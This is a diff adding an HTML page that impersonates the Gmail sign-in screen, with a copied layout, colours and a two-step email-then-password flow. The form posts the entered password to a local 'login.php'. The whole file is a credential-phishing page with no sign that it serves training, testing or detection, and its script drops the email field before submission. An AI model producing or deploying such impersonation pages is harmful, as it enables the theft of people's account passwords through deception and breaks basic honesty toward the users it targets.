@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail - Sign in</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f5f5f5;
+            color: #202124;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        header {
+            padding: 20px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            font-size: 22px;
+            font-weight: 500;
+            color: #5f6368;
+            display: flex;
+            align-items: center;
+        }
+        
+        .logo span {
+            color: #4285f4;
+            font-weight: bold;
+        }
+        
+        .nav-links {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .nav-links a {
+            color: #5f6368;
+            text-decoration: none;
+            font-size: 14px;
+            padding: 8px 12px;
+            border-radius: 4px;
+        }
+        
+        .nav-links a:hover {
+            background-color: rgba(0, 0, 0, 0.05);
+        }
+        
+        .sign-in-btn {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 8px 24px;
+            border-radius: 4px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        
+        .sign-in-btn:hover {
+            background-color: #1b66c9;
+            box-shadow: 0 1px 2px 0 rgba(66, 133, 244, 0.3);
+        }
+        
+        main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .login-container {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 450px;
+            padding: 48px 40px 36px;
+        }
+        
+        .login-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .login-header h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 10px;
+        }
+        
+        .login-header p {
+            color: #5f6368;
+            font-size: 16px;
+        }
+        
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        
+        .input-group {
+            position: relative;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+        }
+        
+        .input-group input:focus {
+            border-color: #1a73e8;
+            border-width: 2px;
+            padding: 12px 14px;
+        }
+        
+        .input-group label {
+            position: absolute;
+            top: 13px;
+            left: 15px;
+            color: #5f6368;
+            font-size: 16px;
+            pointer-events: none;
+            transition: all 0.2s;
+            background-color: white;
+            padding: 0 5px;
+        }
+        
+        .input-group input:focus + label,
+        .input-group input:not(:placeholder-shown) + label {
+            top: -8px;
+            font-size: 12px;
+            color: #1a73e8;
+        }
+        
+        .forgot-email {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        
+        .forgot-email:hover {
+            text-decoration: underline;
+        }
+        
+        .login-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 30px;
+        }
+        
+        .create-account {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        
+        .create-account:hover {
+            text-decoration: underline;
+        }
+        
+        .next-btn {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-weight: 500;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        
+        .next-btn:hover {
+            background-color: #1b66c9;
+            box-shadow: 0 1px 2px 0 rgba(66, 133, 244, 0.3);
+        }
+        
+        footer {
+            padding: 20px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        
+        .footer-links {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .language-selector {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        select {
+            border: none;
+            background: none;
+            color: #5f6368;
+            outline: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo">
+            G<span>mail</span>
+        </div>
+        <div class="nav-links">
+            <a href="#">For work</a>
+            <button class="sign-in-btn">Sign in</button>
+        </div>
+    </header>
+    
+    <main>
+        <div class="login-container">
+            <div class="login-header">
+                <h1>Sign in</h1>
+                <p>to continue to Gmail</p>
+            </div>
+            <form class="login-form" method="POST" action="login.php" id="loginForm">
+<div class="input-group">
+                    <input type="email" id="username" name="username" placeholder=" " required>
+                    <label for="email">Email or phone</label>
+                </div>
+                <a href="#" class="forgot-email">Forgot email?</a>
+                
+                <div class="login-actions">
+                    <a href="#" class="create-account">Create account</a>
+                    <button type="button" class="next-btn" id="nextBtn">Next</button>
+                    <button type="submit" class="next-btn" id="submitBtn" style="display: none;">Submit</button>
+                </div>
+</form>
+        </div>
+    </main>
+    
+    <footer>
+        <div class="footer-links">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+        
+        <div class="language-selector">
+            <span>English (United States)</span>
+            <select>
+                <option>▼</option>
+            </select>
+        </div>
+    </footer>
+
+    <script>
+        document.getElementById('nextBtn').addEventListener('click', function() {
+            const emailInput = document.getElementById('username');
+            const email = emailInput.value;
+            
+            if (email.trim() === '') {
+                alert('Please enter your email');
+                return;
+            }
+
+            // Hide email field and show password field
+            emailInput.style.display = 'none';
+            
+            const passwordInput = document.createElement('input');
+            passwordInput.type = 'password';
+            passwordInput.id = 'password';
+            passwordInput.name = 'password';
+            passwordInput.placeholder = ' ';
+            passwordInput.required = true;
+            passwordInput.style.width = '100%';
+            passwordInput.style.padding = '13px 15px';
+            passwordInput.style.fontSize = '16px';
+            passwordInput.style.border = '1px solid #dadce0';
+            passwordInput.style.borderRadius = '4px';
+            passwordInput.style.outline = 'none';
+            
+            const passwordLabel = document.createElement('label');
+            passwordLabel.htmlFor = 'password';
+            passwordLabel.textContent = 'Enter your password';
+            passwordLabel.style.position = 'absolute';
+            passwordLabel.style.top = '-8px';
+            passwordLabel.style.left = '15px';
+            passwordLabel.style.color = '#1a73e8';
+            passwordLabel.style.fontSize = '12px';
+            passwordLabel.style.backgroundColor = 'white';
+            passwordLabel.style.padding = '0 5px';
+            passwordLabel.style.pointerEvents = 'none';
+            
+            const inputGroup = document.querySelector('.input-group');
+            inputGroup.innerHTML = '';
+            inputGroup.appendChild(passwordInput);
+            inputGroup.appendChild(passwordLabel);
+            
+            // Change buttons
+            document.getElementById('nextBtn').style.display = 'none';
+            document.getElementById('submitBtn').style.display = 'block';
+        });
+    </script>
+</body>
+</html>
